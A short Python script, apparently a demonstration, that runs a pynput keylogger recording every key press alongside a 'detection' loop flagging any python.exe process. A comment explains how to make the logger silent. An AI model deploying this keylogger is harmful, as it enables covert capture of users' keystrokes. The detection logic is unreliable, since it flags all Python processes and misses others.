import threading
import time
import psutil
from pynput.keyboard import Key, Listener

# ========== Keylogger code ==========
keys = []

def on_press(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))  # You can remove this line to make it silent

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ========== Keylogger detection code ==========
def detect_keylogger():
    keylogger_process_names = ['python.exe']  # Assumes keylogger runs as a Python process

    while True:
        running_processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
        for process in running_processes:
            if process['name'] and process['name'].lower() in keylogger_process_names:
                print(f"⚠ Potential keylogger detected: PID {process['pid']} - Name: {process['name']}")
        time.sleep(5)  # Check every 5 seconds

# ========== Run both parts ==========
if __name__ == "__main__":

    # Start keylogger in a separate thread
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    # Start detection in main thread
    detect_keylogger()